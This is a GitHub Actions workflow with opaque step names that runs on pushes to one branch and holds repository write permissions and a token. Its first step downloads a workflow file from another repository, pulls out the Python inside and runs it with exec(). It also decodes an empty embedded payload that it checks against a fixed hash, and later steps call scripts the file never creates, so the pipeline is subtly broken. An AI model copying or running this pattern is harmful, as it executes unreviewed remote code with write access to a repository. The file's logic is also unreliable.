name: Isolate host outputs before exact product delivery
'on':
  push:
    branches:
      - ci/shortcut-storage-preflight-4d8742
permissions:
  contents: write
  actions: write
  checks: write
concurrency:
  group: shortcut-business-bridge-delivery
  cancel-in-progress: false
jobs:
  activation_delivery:
    runs-on: ubuntu-24.04
    timeout-minutes: 120
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
        with:
          ref: 3a5a17e1fdc570c73804007cd9a4d2ef36c0966b
          persist-credentials: false
      - name: Restore immutable original delivery and bounded worktree separation
        run: |
          set -euo pipefail
          python3 - <<'PY'
          import ast,hashlib,os,pathlib,urllib.request
          url="https://raw.githubusercontent.com/supercubegame/todo-pocket-android/42f2ae2fc8bfd6de86a92aed21784da195aee31c/.github/workflows/shortcut-storage.yml"
          with urllib.request.urlopen(url,timeout=60) as response:raw=response.read(14885)
          assert len(raw)==14884 and hashlib.sha256(raw).hexdigest()=="968ed9265fb35f7f1614e866da37e91159ea3865eb519ec49bbb1482007d5592"
          body=raw.decode().split("          python3 - <<'PY'\n",1)[1].split("          PY\n",1)[0]
          assert all(not line or line.startswith("          ") for line in body.splitlines())
          code="\n".join(line[10:] for line in body.splitlines())+"\n"
          ast.parse(code);exec(compile(code,"immutable-original-driver","exec"),{})
          import base64,json,lzma
          payload=lzma.decompress(base64.b64decode('',validate=True))
          assert hashlib.sha256(payload).hexdigest()=='24cea102fde4353e36ffa3926dbd9479c0754e5d473c22c097a9365198ba44b7'
          bundle=json.loads(payload)
          assert set(bundle)=={"isolate-delivery-validation.py","test-validation-worktree.py"}
          for name,code in bundle.items():
              ast.parse(code);(pathlib.Path(os.environ["RUNNER_TEMP"])/name).write_text(code)
          PY
      - name: Use Java17 and test delivery failure boundaries
        run: |
          set -euo pipefail
          echo "JAVA_HOME=$JAVA_HOME_17_X64" >> "$GITHUB_ENV"
          echo "$JAVA_HOME_17_X64/bin" >> "$GITHUB_PATH"
          python3 "$RUNNER_TEMP/test-deliver-accepted.py"
          python3 "$RUNNER_TEMP/test-validation-worktree.py"
          python3 - <<'PY'
          import importlib.util,os,pathlib
          root=pathlib.Path(os.environ["RUNNER_TEMP"])
          spec=importlib.util.spec_from_file_location("isolate",root/"isolate-delivery-validation.py")
          m=importlib.util.module_from_spec(spec);spec.loader.exec_module(m)
          p=root/"deliver-accepted.py";p.write_text(m.patch_source(p.read_text()))
          PY
      - name: Verify accepted archive, full21 hosts, atomic product update and dispatch
        id: delivery
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          python3 "$RUNNER_TEMP/deliver-accepted.py" "$GITHUB_WORKSPACE" "$RUNNER_TEMP/product-delivery"
      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02
        id: evidence
        if: always()
        with:
          name: activation-product-delivery
          path: ${{ runner.temp }}/product-delivery/
          if-no-files-found: error
          retention-days: 14
      - name: Publish complete original delivery receipt with exact readback
        if: always()
        env:
          GH_TOKEN: ${{ github.token }}
          ARTIFACT_URL: ${{ steps.evidence.outputs.artifact-url }}
          DELIVERY_OUTCOME: ${{ steps.delivery.outcome }}
        run: |
          set -euo pipefail
          python3 "$RUNNER_TEMP/deliver-accepted.py" publish "$RUNNER_TEMP/product-delivery"
